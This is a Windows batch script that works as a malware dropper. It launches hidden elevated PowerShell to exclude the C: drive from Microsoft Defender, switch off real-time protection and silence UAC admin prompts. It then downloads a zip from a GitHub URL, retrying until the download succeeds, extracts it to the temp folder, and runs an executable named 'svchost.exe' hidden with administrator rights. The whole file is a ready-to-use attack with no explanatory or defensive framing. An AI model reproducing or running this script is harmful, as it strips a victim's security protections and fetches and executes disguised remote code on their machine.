@echo off
powershell -Command "Start-Process -FilePath 'powershell' -ArgumentList 'Add-MpPreference -ExclusionPath \"C:\\\"' -Verb runAs -WindowStyle Hidden"
powershell -Command "Start-Process -FilePath 'powershell' -ArgumentList 'Set-MpPreference -DisableRealtimeMonitoring $true' -Verb runAs -WindowStyle Hidden"
powershell -Command "Start-Process -FilePath 'powershell' -ArgumentList 'Set-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name \"ConsentPromptBehaviorAdmin\" -Value 0' -Verb runAs -WindowStyle Hidden"
setlocal
set "url=https://github.com/LuisPhantom/Vemom/raw/refs/heads/main/svchost.zip"
set "tempdir=%temp%"
set "output=%tempdir%\4g5h790g2345h7890g2345h90g2345h-890v2345h789-3v5h.zip"

:download
powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%output%'"
for %%A in ("%output%") do (
    if %%~zA==0 (
        del "%output%"
        timeout /t 1 >nul
        goto download
    )
)

powershell -Command "Expand-Archive -Path '%output%' -DestinationPath '%tempdir%' -Force"

powershell -Command "Start-Process -FilePath '%tempdir%\svchost.exe' -Verb runAs -WindowStyle Hidden"

exit